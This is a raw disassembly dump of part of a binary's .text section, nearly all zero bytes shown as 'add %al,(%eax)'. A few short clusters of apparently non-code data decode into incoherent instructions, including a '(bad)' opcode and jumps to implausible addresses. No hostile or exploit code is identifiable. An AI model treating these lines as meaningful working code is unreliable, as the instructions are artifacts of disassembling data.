                           .text:004019df 00 00                            add    %al,(%eax)
                           .text:004019e1 00 00                            add    %al,(%eax)
                           .text:004019e3 00 00                            add    %al,(%eax)
                           .text:004019e5 00 00                            add    %al,(%eax)
                           .text:004019e7 00 00                            add    %al,(%eax)
                           .text:004019e9 00 00                            add    %al,(%eax)
                           .text:004019eb 00 00                            add    %al,(%eax)
                           .text:004019ed 00 00                            add    %al,(%eax)
                           .text:004019ef 00 00                            add    %al,(%eax)
                           .text:004019f1 00 00                            add    %al,(%eax)
                           .text:004019f3 00 00                            add    %al,(%eax)
                           .text:004019f5 00 00                            add    %al,(%eax)
                           .text:004019f7 00 00                            add    %al,(%eax)
                           .text:004019f9 00 00                            add    %al,(%eax)
                           .text:004019fb 00 00                            add    %al,(%eax)
                           .text:004019fd 00 00                            add    %al,(%eax)
                           .text:004019ff 00 00                            add    %al,(%eax)
                           .text:00401a01 00 00                            add    %al,(%eax)
                           .text:00401a03 00 00                            add    %al,(%eax)
                           .text:00401a05 00 00                            add    %al,(%eax)
                           .text:00401a07 00 00                            add    %al,(%eax)
                           .text:00401a09 00 00                            add    %al,(%eax)
                           .text:00401a0b 00 00                            add    %al,(%eax)
                           .text:00401a0d 00 00                            add    %al,(%eax)
                           .text:00401a0f 00 00                            add    %al,(%eax)
                           .text:00401a11 00 00                            add    %al,(%eax)
                           .text:00401a13 00 00                            add    %al,(%eax)
                           .text:00401a15 00 00                            add    %al,(%eax)
                           .text:00401a17 00 00                            add    %al,(%eax)
                           .text:00401a19 00 00                            add    %al,(%eax)
                           .text:00401a1b 00 00                            add    %al,(%eax)
                           .text:00401a1d 00 00                            add    %al,(%eax)
                           .text:00401a1f 00 00                            add    %al,(%eax)
                           .text:00401a21 00 00                            add    %al,(%eax)
                           .text:00401a23 00 00                            add    %al,(%eax)
                           .text:00401a25 00 00                            add    %al,(%eax)
                           .text:00401a27 00 41 2d                         add    %al,0x2d(%ecx)
                           .text:00401a2a 47                               inc    %edi
                           .text:00401a2b 9e                               sahf   
                           .text:00401a2c 9e                               sahf   
                           .text:00401a2d e9 3f 43 38 15                   jmp    0x15785d71
                           .text:00401a32 63 b8 bf 7f 00 00                arpl   %di,0x7fbf(%eax)
                           .text:00401a38 60                               pusha  
                           .text:00401a39 58                               pop    %eax
                           .text:00401a3a 70 00                            jo     0x00401a3c
                           .text:00401a3c 00 00                            add    %al,(%eax)
                           .text:00401a3e 00 00                            add    %al,(%eax)
                           .text:00401a40 00 00                            add    %al,(%eax)
                           .text:00401a42 00 00                            add    %al,(%eax)
                           .text:00401a44 00 00                            add    %al,(%eax)
                           .text:00401a46 00 00                            add    %al,(%eax)
                           .text:00401a48 00 00                            add    %al,(%eax)
                           .text:00401a4a 00 00                            add    %al,(%eax)
                           .text:00401a4c 00 00                            add    %al,(%eax)
                           .text:00401a4e 00 00                            add    %al,(%eax)
                           .text:00401a50 00 00                            add    %al,(%eax)
                           .text:00401a52 00 00                            add    %al,(%eax)
                           .text:00401a54 00 00                            add    %al,(%eax)
                           .text:00401a56 00 00                            add    %al,(%eax)
                           .text:00401a58 00 00                            add    %al,(%eax)
                           .text:00401a5a 00 00                            add    %al,(%eax)
                           .text:00401a5c 00 00                            add    %al,(%eax)
                           .text:00401a5e 00 00                            add    %al,(%eax)
                           .text:00401a60 00 00                            add    %al,(%eax)
                           .text:00401a62 00 00                            add    %al,(%eax)
                           .text:00401a64 00 00                            add    %al,(%eax)
                           .text:00401a66 00 00                            add    %al,(%eax)
                           .text:00401a68 00 00                            add    %al,(%eax)
                           .text:00401a6a 00 00                            add    %al,(%eax)
                           .text:00401a6c 00 00                            add    %al,(%eax)
                           .text:00401a6e 00 00                            add    %al,(%eax)
                           .text:00401a70 00 00                            add    %al,(%eax)
                           .text:00401a72 00 00                            add    %al,(%eax)
                           .text:00401a74 00 00                            add    %al,(%eax)
                           .text:00401a76 00 00                            add    %al,(%eax)
                           .text:00401a78 00 00                            add    %al,(%eax)
                           .text:00401a7a 00 00                            add    %al,(%eax)
                           .text:00401a7c 00 00                            add    %al,(%eax)
                           .text:00401a7e 00 00                            add    %al,(%eax)
                           .text:00401a80 00 00                            add    %al,(%eax)
                           .text:00401a82 00 00                            add    %al,(%eax)
                           .text:00401a84 00 00                            add    %al,(%eax)
                           .text:00401a86 00 00                            add    %al,(%eax)
                           .text:00401a88 00 00                            add    %al,(%eax)
                           .text:00401a8a 00 00                            add    %al,(%eax)
                           .text:00401a8c 00 00                            add    %al,(%eax)
                           .text:00401a8e 00 00                            add    %al,(%eax)
                           .text:00401a90 00 00                            add    %al,(%eax)
                           .text:00401a92 00 00                            add    %al,(%eax)
                           .text:00401a94 00 00                            add    %al,(%eax)
                           .text:00401a96 00 00                            add    %al,(%eax)
                           .text:00401a98 00 00                            add    %al,(%eax)
                           .text:00401a9a 00 00                            add    %al,(%eax)
                           .text:00401a9c 00 00                            add    %al,(%eax)
                           .text:00401a9e 00 00                            add    %al,(%eax)
                           .text:00401aa0 46                               inc    %esi
                           .text:00401aa1 b1 34                            mov    $0x34,%cl
                           .text:00401aa3 ec                               in     (%dx),%al
                           .text:00401aa4 83 00 cf                         addl   $0xffffffcf,(%eax)
                           .text:00401aa7 30 20                            xor    %ah,(%eax)
                           .text:00401aa9 3a 24 b9                         cmp    (%ecx,%edi,4),%ah
                           .text:00401aac bf 7f 00 00 b0                   mov    $0xb000007f,%edi
                           .text:00401ab1 58                               pop    %eax
                           .text:00401ab2 70 00                            jo     0x00401ab4
                           .text:00401ab4 00 00                            add    %al,(%eax)
                           .text:00401ab6 00 00                            add    %al,(%eax)
                           .text:00401ab8 00 00                            add    %al,(%eax)
                           .text:00401aba 00 00                            add    %al,(%eax)
                           .text:00401abc 00 00                            add    %al,(%eax)
                           .text:00401abe 00 00                            add    %al,(%eax)
                           .text:00401ac0 00 00                            add    %al,(%eax)
                           .text:00401ac2 00 00                            add    %al,(%eax)
                           .text:00401ac4 00 00                            add    %al,(%eax)
                           .text:00401ac6 00 00                            add    %al,(%eax)
                           .text:00401ac8 00 00                            add    %al,(%eax)
                           .text:00401aca 00 00                            add    %al,(%eax)
                           .text:00401acc 00 00                            add    %al,(%eax)
                           .text:00401ace 00 00                            add    %al,(%eax)
                           .text:00401ad0 00 00                            add    %al,(%eax)
                           .text:00401ad2 00 00                            add    %al,(%eax)
                           .text:00401ad4 00 00                            add    %al,(%eax)
                           .text:00401ad6 00 00                            add    %al,(%eax)
                           .text:00401ad8 00 00                            add    %al,(%eax)
                           .text:00401ada 00 00                            add    %al,(%eax)
                           .text:00401adc 00 00                            add    %al,(%eax)
                           .text:00401ade 00 00                            add    %al,(%eax)
                           .text:00401ae0 00 00                            add    %al,(%eax)
                           .text:00401ae2 00 00                            add    %al,(%eax)
                           .text:00401ae4 00 00                            add    %al,(%eax)
                           .text:00401ae6 00 00                            add    %al,(%eax)
                           .text:00401ae8 00 00                            add    %al,(%eax)
                           .text:00401aea 00 00                            add    %al,(%eax)
                           .text:00401aec 00 00                            add    %al,(%eax)
                           .text:00401aee 00 00                            add    %al,(%eax)
                           .text:00401af0 00 00                            add    %al,(%eax)
                           .text:00401af2 00 00                            add    %al,(%eax)
                           .text:00401af4 00 00                            add    %al,(%eax)
                           .text:00401af6 00 00                            add    %al,(%eax)
                           .text:00401af8 00 00                            add    %al,(%eax)
                           .text:00401afa 00 00                            add    %al,(%eax)
                           .text:00401afc 00 00                            add    %al,(%eax)
                           .text:00401afe 00 00                            add    %al,(%eax)
                           .text:00401b00 00 00                            add    %al,(%eax)
                           .text:00401b02 00 00                            add    %al,(%eax)
                           .text:00401b04 00 00                            add    %al,(%eax)
                           .text:00401b06 00 00                            add    %al,(%eax)
                           .text:00401b08 00 00                            add    %al,(%eax)
                           .text:00401b0a 00 00                            add    %al,(%eax)
                           .text:00401b0c 00 00                            add    %al,(%eax)
                           .text:00401b0e 00 00                            add    %al,(%eax)
                           .text:00401b10 00 00                            add    %al,(%eax)
                           .text:00401b12 00 00                            add    %al,(%eax)
                           .text:00401b14 00 00                            add    %al,(%eax)
                           .text:00401b16 00 00                            add    %al,(%eax)
                           .text:00401b18 00 00                            add    %al,(%eax)
                           .text:00401b1a 00 00                            add    %al,(%eax)
                           .text:00401b1c 00 00                            add    %al,(%eax)
                           .text:00401b1e 00 00                            add    %al,(%eax)
                           .text:00401b20 00 00                            add    %al,(%eax)
                           .text:00401b22 00 00                            add    %al,(%eax)
                           .text:00401b24 00 00                            add    %al,(%eax)
                           .text:00401b26 00 00                            add    %al,(%eax)
                           .text:00401b28 00 00                            add    %al,(%eax)
                           .text:00401b2a 00 00                            add    %al,(%eax)
                           .text:00401b2c 00 00                            add    %al,(%eax)
                           .text:00401b2e 00 00                            add    %al,(%eax)
                           .text:00401b30 00 00                            add    %al,(%eax)
                           .text:00401b32 00 00                            add    %al,(%eax)
                           .text:00401b34 00 00                            add    %al,(%eax)
                           .text:00401b36 00 00                            add    %al,(%eax)
                           .text:00401b38 00 00                            add    %al,(%eax)
                           .text:00401b3a 00 00                            add    %al,(%eax)
                           .text:00401b3c 00 00                            add    %al,(%eax)
                           .text:00401b3e 00 00                            add    %al,(%eax)
                           .text:00401b40 00 00                            add    %al,(%eax)
                           .text:00401b42 00 00                            add    %al,(%eax)
                           .text:00401b44 00 00                            add    %al,(%eax)
                           .text:00401b46 00 00                            add    %al,(%eax)
                           .text:00401b48 00 00                            add    %al,(%eax)
                           .text:00401b4a 00 00                            add    %al,(%eax)
                           .text:00401b4c 00 00                            add    %al,(%eax)
                           .text:00401b4e 00 00                            add    %al,(%eax)
                           .text:00401b50 00 00                            add    %al,(%eax)
                           .text:00401b52 00 00                            add    %al,(%eax)
                           .text:00401b54 00 00                            add    %al,(%eax)
                           .text:00401b56 00 00                            add    %al,(%eax)
                           .text:00401b58 00 00                            add    %al,(%eax)
                           .text:00401b5a 00 00                            add    %al,(%eax)
                           .text:00401b5c 00 00                            add    %al,(%eax)
                           .text:00401b5e 00 00                            add    %al,(%eax)
                           .text:00401b60 00 00                            add    %al,(%eax)
                           .text:00401b62 00 00                            add    %al,(%eax)
                           .text:00401b64 00 00                            add    %al,(%eax)
                           .text:00401b66 00 00                            add    %al,(%eax)
                           .text:00401b68 00 00                            add    %al,(%eax)
                           .text:00401b6a 00 00                            add    %al,(%eax)
                           .text:00401b6c 00 00                            add    %al,(%eax)
                           .text:00401b6e 00 00                            add    %al,(%eax)
                           .text:00401b70 00 00                            add    %al,(%eax)
                           .text:00401b72 00 00                            add    %al,(%eax)
                           .text:00401b74 00 00                            add    %al,(%eax)
                           .text:00401b76 00 00                            add    %al,(%eax)
                           .text:00401b78 00 00                            add    %al,(%eax)
                           .text:00401b7a 00 00                            add    %al,(%eax)
                           .text:00401b7c 00 00                            add    %al,(%eax)
                           .text:00401b7e 00 00                            add    %al,(%eax)
                           .text:00401b80 00 00                            add    %al,(%eax)
                           .text:00401b82 00 00                            add    %al,(%eax)
                           .text:00401b84 00 00                            add    %al,(%eax)
                           .text:00401b86 00 00                            add    %al,(%eax)
                           .text:00401b88 00 00                            add    %al,(%eax)
                           .text:00401b8a 00 00                            add    %al,(%eax)
                           .text:00401b8c 00 00                            add    %al,(%eax)
                           .text:00401b8e 00 00                            add    %al,(%eax)
                           .text:00401b90 50                               push   %eax
                           .text:00401b91 e8 a8 25 8f f3                   call   0xf3cf413e
                           .text:00401b96 5d                               pop    %ebp
                           .text:00401b97 53                               push   %ebx
                           .text:00401b98 b0 3d                            mov    $0x3d,%al
                           .text:00401b9a 24 b9                            and    $0xb9,%al
                           .text:00401b9c bf 7f 00 00 80                   mov    $0x8000007f,%edi
                           .text:00401ba1 58                               pop    %eax
                           .text:00401ba2 70 00                            jo     0x00401ba4
                           .text:00401ba4 00 00                            add    %al,(%eax)
                           .text:00401ba6 00 00                            add    %al,(%eax)
                           .text:00401ba8 00 00                            add    %al,(%eax)
                           .text:00401baa 00 00                            add    %al,(%eax)
                           .text:00401bac 00 00                            add    %al,(%eax)
                           .text:00401bae 00 00                            add    %al,(%eax)
                           .text:00401bb0 00 00                            add    %al,(%eax)
                           .text:00401bb2 00 00                            add    %al,(%eax)
                           .text:00401bb4 00 00                            add    %al,(%eax)
                           .text:00401bb6 00 00                            add    %al,(%eax)
                           .text:00401bb8 00 00                            add    %al,(%eax)
                           .text:00401bba 00 00                            add    %al,(%eax)
                           .text:00401bbc 00 00                            add    %al,(%eax)
                           .text:00401bbe 00 00                            add    %al,(%eax)
                           .text:00401bc0 00 00                            add    %al,(%eax)
                           .text:00401bc2 00 00                            add    %al,(%eax)
                           .text:00401bc4 00 00                            add    %al,(%eax)
                           .text:00401bc6 00 00                            add    %al,(%eax)
                           .text:00401bc8 00 00                            add    %al,(%eax)
                           .text:00401bca 00 00                            add    %al,(%eax)
                           .text:00401bcc 00 00                            add    %al,(%eax)
                           .text:00401bce 00 00                            add    %al,(%eax)
                           .text:00401bd0 00 00                            add    %al,(%eax)
                           .text:00401bd2 00 00                            add    %al,(%eax)
                           .text:00401bd4 00 00                            add    %al,(%eax)
                           .text:00401bd6 00 00                            add    %al,(%eax)
                           .text:00401bd8 d3 88 a6 73 f8 10                rorl   %cl,0x10f873a6(%eax)
                           .text:00401bde 10 46 00                         adc    %al,0x0(%esi)
                           .text:00401be1 3f                               aas    
                           .text:00401be2 24 b9                            and    $0xb9,%al
                           .text:00401be4 bf 7f 00 00 b0                   mov    $0xb000007f,%edi
                           .text:00401be9 58                               pop    %eax
                           .text:00401bea 70 00                            jo     0x00401bec
                           .text:00401bec 00 00                            add    %al,(%eax)
                           .text:00401bee 00 00                            add    %al,(%eax)
                           .text:00401bf0 00 00                            add    %al,(%eax)
                           .text:00401bf2 00 00                            add    %al,(%eax)
                           .text:00401bf4 00 00                            add    %al,(%eax)
                           .text:00401bf6 00 00                            add    %al,(%eax)
                           .text:00401bf8 00 00                            add    %al,(%eax)
                           .text:00401bfa 00 00                            add    %al,(%eax)
                           .text:00401bfc 00 00                            add    %al,(%eax)
                           .text:00401bfe 00 00                            add    %al,(%eax)
                           .text:00401c00 00 00                            add    %al,(%eax)
                           .text:00401c02 00 00                            add    %al,(%eax)
                           .text:00401c04 00 00                            add    %al,(%eax)
                           .text:00401c06 00 00                            add    %al,(%eax)
                           .text:00401c08 55                               push   %ebp
                           .text:00401c09 27                               daa    
                           .text:00401c0a b1 76                            mov    $0x76,%cl
                           .text:00401c0c 2a f8                            sub    %al,%bh
                           .text:00401c0e 61                               popa   
                           .text:00401c0f df 70 15                         fbstp  0x15(%eax)
                           .text:00401c12 63 b8 bf 7f 00 00                arpl   %di,0x7fbf(%eax)
                           .text:00401c18 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401c1b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401c21 00 00                            add    %al,(%eax)
                           .text:00401c23 00 00                            add    %al,(%eax)
                           .text:00401c25 00 00                            add    %al,(%eax)
                           .text:00401c27 00 00                            add    %al,(%eax)
                           .text:00401c29 00 00                            add    %al,(%eax)
                           .text:00401c2b 00 00                            add    %al,(%eax)
                           .text:00401c2d 00 00                            add    %al,(%eax)
                           .text:00401c2f 00 00                            add    %al,(%eax)
                           .text:00401c31 00 00                            add    %al,(%eax)
                           .text:00401c33 00 00                            add    %al,(%eax)
                           .text:00401c35 00 00                            add    %al,(%eax)
                           .text:00401c37 00 d7                            add    %dl,%bh
                           .text:00401c39 be a7 51 6b b7                   mov    $0xb76b51a7,%esi
                           .text:00401c3e 9b                               fwait
                           .text:00401c3f 56                               push   %esi
                           .text:00401c40 70 f5                            jo     0x00401c37
                           .text:00401c42 32 b9 bf 7f 00 00                xor    0x7fbf(%ecx),%bh
                           .text:00401c48 10 16                            adc    %dl,(%esi)
                           .text:00401c4a 64 b8 bf 7f 00 00                fs mov $0x7fbf,%eax
                           .text:00401c50 00 00                            add    %al,(%eax)
                           .text:00401c52 00 00                            add    %al,(%eax)
                           .text:00401c54 00 00                            add    %al,(%eax)
                           .text:00401c56 00 00                            add    %al,(%eax)
                           .text:00401c58 00 00                            add    %al,(%eax)
                           .text:00401c5a 00 00                            add    %al,(%eax)
                           .text:00401c5c 00 00                            add    %al,(%eax)
                           .text:00401c5e 00 00                            add    %al,(%eax)
                           .text:00401c60 00 00                            add    %al,(%eax)
                           .text:00401c62 00 00                            add    %al,(%eax)
                           .text:00401c64 00 00                            add    %al,(%eax)
                           .text:00401c66 00 00                            add    %al,(%eax)
                           .text:00401c68 00 00                            add    %al,(%eax)
                           .text:00401c6a 00 00                            add    %al,(%eax)
                           .text:00401c6c 00 00                            add    %al,(%eax)
                           .text:00401c6e 00 00                            add    %al,(%eax)
                           .text:00401c70 00 00                            add    %al,(%eax)
                           .text:00401c72 00 00                            add    %al,(%eax)
                           .text:00401c74 00 00                            add    %al,(%eax)
                           .text:00401c76 00 00                            add    %al,(%eax)
                           .text:00401c78 00 00                            add    %al,(%eax)
                           .text:00401c7a 00 00                            add    %al,(%eax)
                           .text:00401c7c 00 00                            add    %al,(%eax)
                           .text:00401c7e 00 00                            add    %al,(%eax)
                           .text:00401c80 00 00                            add    %al,(%eax)
                           .text:00401c82 00 00                            add    %al,(%eax)
                           .text:00401c84 00 00                            add    %al,(%eax)
                           .text:00401c86 00 00                            add    %al,(%eax)
                           .text:00401c88 00 00                            add    %al,(%eax)
                           .text:00401c8a 00 00                            add    %al,(%eax)
                           .text:00401c8c 00 00                            add    %al,(%eax)
                           .text:00401c8e 00 00                            add    %al,(%eax)
                           .text:00401c90 00 00                            add    %al,(%eax)
                           .text:00401c92 00 00                            add    %al,(%eax)
                           .text:00401c94 00 00                            add    %al,(%eax)
                           .text:00401c96 00 00                            add    %al,(%eax)
                           .text:00401c98 5b                               pop    %ebx
                           .text:00401c99 7f ea                            jg     0x00401c85
                           .text:00401c9b 4c                               dec    %esp
                           .text:00401c9c 6b 75 32 a2                      imul   $0xffffffa2,0x32(%ebp),%esi
                           .text:00401ca0 a8 15                            test   $0x15,%al
                           .text:00401ca2 63 b8 bf 7f 00 00                arpl   %di,0x7fbf(%eax)
                           .text:00401ca8 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401cab c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401cb1 00 00                            add    %al,(%eax)
                           .text:00401cb3 00 00                            add    %al,(%eax)
                           .text:00401cb5 00 00                            add    %al,(%eax)
                           .text:00401cb7 00 00                            add    %al,(%eax)
                           .text:00401cb9 00 00                            add    %al,(%eax)
                           .text:00401cbb 00 00                            add    %al,(%eax)
                           .text:00401cbd 00 00                            add    %al,(%eax)
                           .text:00401cbf 00 00                            add    %al,(%eax)
                           .text:00401cc1 00 00                            add    %al,(%eax)
                           .text:00401cc3 00 00                            add    %al,(%eax)
                           .text:00401cc5 00 00                            add    %al,(%eax)
                           .text:00401cc7 00 dd                            add    %bl,%ch
                           .text:00401cc9 14 de                            adc    $0xde,%al
                           .text:00401ccb 7f 8a                            jg     0x00401c57
                           .text:00401ccd b5 b0                            mov    $0xb0,%ch
                           .text:00401ccf 69 50 3d 24 b9 bf 7f             imul   $0x7fbfb924,0x3d(%eax),%edx
                           .text:00401cd6 00 00                            add    %al,(%eax)
                           .text:00401cd8 80 58 70 00                      sbbb   $0x0,0x70(%eax)
                           .text:00401cdc 00 00                            add    %al,(%eax)
                           .text:00401cde 00 00                            add    %al,(%eax)
                           .text:00401ce0 00 00                            add    %al,(%eax)
                           .text:00401ce2 00 00                            add    %al,(%eax)
                           .text:00401ce4 00 00                            add    %al,(%eax)
                           .text:00401ce6 00 00                            add    %al,(%eax)
                           .text:00401ce8 00 00                            add    %al,(%eax)
                           .text:00401cea 00 00                            add    %al,(%eax)
                           .text:00401cec 00 00                            add    %al,(%eax)
                           .text:00401cee 00 00                            add    %al,(%eax)
                           .text:00401cf0 00 00                            add    %al,(%eax)
                           .text:00401cf2 00 00                            add    %al,(%eax)
                           .text:00401cf4 00 00                            add    %al,(%eax)
                           .text:00401cf6 00 00                            add    %al,(%eax)
                           .text:00401cf8 00 00                            add    %al,(%eax)
                           .text:00401cfa 00 00                            add    %al,(%eax)
                           .text:00401cfc 00 00                            add    %al,(%eax)
                           .text:00401cfe 00 00                            add    %al,(%eax)
                           .text:00401d00 00 00                            add    %al,(%eax)
                           .text:00401d02 00 00                            add    %al,(%eax)
                           .text:00401d04 00 00                            add    %al,(%eax)
                           .text:00401d06 00 00                            add    %al,(%eax)
                           .text:00401d08 00 00                            add    %al,(%eax)
                           .text:00401d0a 00 00                            add    %al,(%eax)
                           .text:00401d0c 00 00                            add    %al,(%eax)
                           .text:00401d0e 00 00                            add    %al,(%eax)
                           .text:00401d10 00 00                            add    %al,(%eax)
                           .text:00401d12 00 00                            add    %al,(%eax)
                           .text:00401d14 00 00                            add    %al,(%eax)
                           .text:00401d16 00 00                            add    %al,(%eax)
                           .text:00401d18 00 00                            add    %al,(%eax)
                           .text:00401d1a 00 00                            add    %al,(%eax)
                           .text:00401d1c 00 00                            add    %al,(%eax)
                           .text:00401d1e 00 00                            add    %al,(%eax)
                           .text:00401d20 00 00                            add    %al,(%eax)
                           .text:00401d22 00 00                            add    %al,(%eax)
                           .text:00401d24 00 00                            add    %al,(%eax)
                           .text:00401d26 00 00                            add    %al,(%eax)
                           .text:00401d28 00 00                            add    %al,(%eax)
                           .text:00401d2a 00 00                            add    %al,(%eax)
                           .text:00401d2c 00 00                            add    %al,(%eax)
                           .text:00401d2e 00 00                            add    %al,(%eax)
                           .text:00401d30 00 00                            add    %al,(%eax)
                           .text:00401d32 00 00                            add    %al,(%eax)
                           .text:00401d34 00 00                            add    %al,(%eax)
                           .text:00401d36 00 00                            add    %al,(%eax)
                           .text:00401d38 00 00                            add    %al,(%eax)
                           .text:00401d3a 00 00                            add    %al,(%eax)
                           .text:00401d3c 00 00                            add    %al,(%eax)
                           .text:00401d3e 00 00                            add    %al,(%eax)
                           .text:00401d40 00 00                            add    %al,(%eax)
                           .text:00401d42 00 00                            add    %al,(%eax)
                           .text:00401d44 00 00                            add    %al,(%eax)
                           .text:00401d46 00 00                            add    %al,(%eax)
                           .text:00401d48 00 00                            add    %al,(%eax)
                           .text:00401d4a 00 00                            add    %al,(%eax)
                           .text:00401d4c 00 00                            add    %al,(%eax)
                           .text:00401d4e 00 00                            add    %al,(%eax)
                           .text:00401d50 00 00                            add    %al,(%eax)
                           .text:00401d52 00 00                            add    %al,(%eax)
                           .text:00401d54 00 00                            add    %al,(%eax)
                           .text:00401d56 00 00                            add    %al,(%eax)
                           .text:00401d58 00 00                            add    %al,(%eax)
                           .text:00401d5a 00 00                            add    %al,(%eax)
                           .text:00401d5c 00 00                            add    %al,(%eax)
                           .text:00401d5e 00 00                            add    %al,(%eax)
                           .text:00401d60 00 00                            add    %al,(%eax)
                           .text:00401d62 00 00                            add    %al,(%eax)
                           .text:00401d64 00 00                            add    %al,(%eax)
                           .text:00401d66 00 00                            add    %al,(%eax)
                           .text:00401d68 00 00                            add    %al,(%eax)
                           .text:00401d6a 00 00                            add    %al,(%eax)
                           .text:00401d6c 00 00                            add    %al,(%eax)
                           .text:00401d6e 00 00                            add    %al,(%eax)
                           .text:00401d70 00 00                            add    %al,(%eax)
                           .text:00401d72 00 00                            add    %al,(%eax)
                           .text:00401d74 00 00                            add    %al,(%eax)
                           .text:00401d76 00 00                            add    %al,(%eax)
                           .text:00401d78 00 00                            add    %al,(%eax)
                           .text:00401d7a 00 00                            add    %al,(%eax)
                           .text:00401d7c 00 00                            add    %al,(%eax)
                           .text:00401d7e 00 00                            add    %al,(%eax)
                           .text:00401d80 00 00                            add    %al,(%eax)
                           .text:00401d82 00 00                            add    %al,(%eax)
                           .text:00401d84 00 00                            add    %al,(%eax)
                           .text:00401d86 00 00                            add    %al,(%eax)
                           .text:00401d88 00 00                            add    %al,(%eax)
                           .text:00401d8a 00 00                            add    %al,(%eax)
                           .text:00401d8c 00 00                            add    %al,(%eax)
                           .text:00401d8e 00 00                            add    %al,(%eax)
                           .text:00401d90 00 00                            add    %al,(%eax)
                           .text:00401d92 00 00                            add    %al,(%eax)
                           .text:00401d94 00 00                            add    %al,(%eax)
                           .text:00401d96 00 00                            add    %al,(%eax)
                           .text:00401d98 00 00                            add    %al,(%eax)
                           .text:00401d9a 00 00                            add    %al,(%eax)
                           .text:00401d9c 00 00                            add    %al,(%eax)
                           .text:00401d9e 00 00                            add    %al,(%eax)
                           .text:00401da0 e6 a5                            out    %al,$0xa5
                           .text:00401da2 dd 69 d2                         (bad)  -0x2e(%ecx)
                           .text:00401da5 a3 8a 8a c0 3c                   mov    %eax,0x3cc08a8a
                           .text:00401daa 24 b9                            and    $0xb9,%al
                           .text:00401dac bf 7f 00 00 d0                   mov    $0xd000007f,%edi
                           .text:00401db1 32 0b                            xor    (%ebx),%cl
                           .text:00401db3 b8 bf 7f 00 00                   mov    $0x7fbf,%eax
                           .text:00401db8 e7 32                            out    %eax,$0x32
                           .text:00401dba 3a 79 02                         cmp    0x2(%ecx),%bh
                           .text:00401dbd 5c                               pop    %esp
                           .text:00401dbe 9f                               lahf   
                           .text:00401dbf 8a 80 37 24 b9 bf                mov    -0x4046dbc9(%eax),%al
                           .text:00401dc5 7f 00                            jg     0x00401dc7
                           .text:00401dc7 00 08                            add    %cl,(%eax)
                           .text:00401dc9 55                               push   %ebp
                           .text:00401dca 6d                               insl   (%dx),%es:(%edi)
                           .text:00401dcb c5 bf 7f 00 00 68                lds    0x6800007f(%edi),%edi
                           .text:00401dd1 19 74 74 a6                      sbb    %esi,-0x5a(%esp,%esi,2)
                           .text:00401dd5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:00401dd8 40                               inc    %eax
                           .text:00401dd9 0b 7b b8                         or     -0x48(%ebx),%edi
                           .text:00401ddc bf 7f 00 00 c0                   mov    $0xc000007f,%edi
                           .text:00401de1 0a 0c 05 00 00 00 00             or     0x0(,%eax,1),%cl
                           .text:00401de8 00 00                            add    %al,(%eax)
                           .text:00401dea 00 00                            add    %al,(%eax)
                           .text:00401dec 00 00                            add    %al,(%eax)
                           .text:00401dee 00 00                            add    %al,(%eax)
                           .text:00401df0 00 00                            add    %al,(%eax)
                           .text:00401df2 00 00                            add    %al,(%eax)
                           .text:00401df4 00 00                            add    %al,(%eax)
                           .text:00401df6 00 00                            add    %al,(%eax)
                           .text:00401df8 00 00                            add    %al,(%eax)
                           .text:00401dfa 00 00                            add    %al,(%eax)
                           .text:00401dfc 00 00                            add    %al,(%eax)
                           .text:00401dfe 00 00                            add    %al,(%eax)
                           .text:00401e00 00 00                            add    %al,(%eax)
                           .text:00401e02 00 00                            add    %al,(%eax)
                           .text:00401e04 00 00                            add    %al,(%eax)
                           .text:00401e06 00 00                            add    %al,(%eax)
                           .text:00401e08 00 00                            add    %al,(%eax)
                           .text:00401e0a 00 00                            add    %al,(%eax)
                           .text:00401e0c 00 00                            add    %al,(%eax)
                           .text:00401e0e 00 00                            add    %al,(%eax)
                           .text:00401e10 00 00                            add    %al,(%eax)
                           .text:00401e12 00 00                            add    %al,(%eax)
                           .text:00401e14 00 00                            add    %al,(%eax)
                           .text:00401e16 00 00                            add    %al,(%eax)
                           .text:00401e18 00 00                            add    %al,(%eax)
                           .text:00401e1a 00 00                            add    %al,(%eax)
                           .text:00401e1c 00 00                            add    %al,(%eax)
                           .text:00401e1e 00 00                            add    %al,(%eax)
                           .text:00401e20 00 00                            add    %al,(%eax)
                           .text:00401e22 00 00                            add    %al,(%eax)
                           .text:00401e24 00 00                            add    %al,(%eax)
                           .text:00401e26 00 00                            add    %al,(%eax)
                           .text:00401e28 00 00                            add    %al,(%eax)
                           .text:00401e2a 00 00                            add    %al,(%eax)
                           .text:00401e2c 00 00                            add    %al,(%eax)
                           .text:00401e2e 00 00                            add    %al,(%eax)
                           .text:00401e30 00 00                            add    %al,(%eax)
                           .text:00401e32 00 00                            add    %al,(%eax)
                           .text:00401e34 00 00                            add    %al,(%eax)
                           .text:00401e36 00 00                            add    %al,(%eax)
                           .text:00401e38 00 00                            add    %al,(%eax)
                           .text:00401e3a 00 00                            add    %al,(%eax)
                           .text:00401e3c 00 00                            add    %al,(%eax)
                           .text:00401e3e 00 00                            add    %al,(%eax)
                           .text:00401e40 00 00                            add    %al,(%eax)
                           .text:00401e42 00 00                            add    %al,(%eax)
                           .text:00401e44 00 00                            add    %al,(%eax)
                           .text:00401e46 00 00                            add    %al,(%eax)
                           .text:00401e48 00 00                            add    %al,(%eax)
                           .text:00401e4a 00 00                            add    %al,(%eax)
                           .text:00401e4c 00 00                            add    %al,(%eax)
                           .text:00401e4e 00 00                            add    %al,(%eax)
                           .text:00401e50 00 00                            add    %al,(%eax)
                           .text:00401e52 00 00                            add    %al,(%eax)
                           .text:00401e54 00 00                            add    %al,(%eax)
                           .text:00401e56 00 00                            add    %al,(%eax)
                           .text:00401e58 00 00                            add    %al,(%eax)
                           .text:00401e5a 00 00                            add    %al,(%eax)
                           .text:00401e5c 00 00                            add    %al,(%eax)
                           .text:00401e5e 00 00                            add    %al,(%eax)
                           .text:00401e60 00 00                            add    %al,(%eax)
                           .text:00401e62 00 00                            add    %al,(%eax)
                           .text:00401e64 00 00                            add    %al,(%eax)
                           .text:00401e66 00 00                            add    %al,(%eax)
                           .text:00401e68 00 00                            add    %al,(%eax)
                           .text:00401e6a 00 00                            add    %al,(%eax)
                           .text:00401e6c 00 00                            add    %al,(%eax)
                           .text:00401e6e 00 00                            add    %al,(%eax)
                           .text:00401e70 00 00                            add    %al,(%eax)
                           .text:00401e72 00 00                            add    %al,(%eax)
                           .text:00401e74 00 00                            add    %al,(%eax)
                           .text:00401e76 00 00                            add    %al,(%eax)
                           .text:00401e78 00 00                            add    %al,(%eax)
